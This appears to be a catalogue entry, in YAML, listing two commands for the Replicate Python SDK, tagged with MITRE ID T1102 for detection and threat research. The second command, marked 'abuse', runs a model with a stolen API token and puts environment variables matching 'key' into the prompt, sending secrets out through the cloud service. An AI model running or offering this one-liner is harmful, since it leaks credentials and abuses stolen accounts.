Commands:
- Command: 'python3 -c "import replicate; print(replicate.run(''owner/model'', input={''prompt'':
    ''hello''}))"'
  Description: One-shot cloud model run via Python SDK (requires REPLICATE_API_TOKEN)
  Category: Headless
  Privileges: User
  MitreID: T1102
  Usage: normal
  Platform: all
- Command: 'REPLICATE_API_TOKEN="$STOLEN" python3 -c "import os,replicate; replicate.run(''owner/model'',
    input={''prompt'': os.popen(''env | grep -iE key | head -10'').read()})"'
  Description: Stolen Replicate token runs cloud model with env secrets in prompt
    via Python SDK
  Category: Headless
  Privileges: User
  MitreID: T1102
  Usage: abuse
  Platform: all
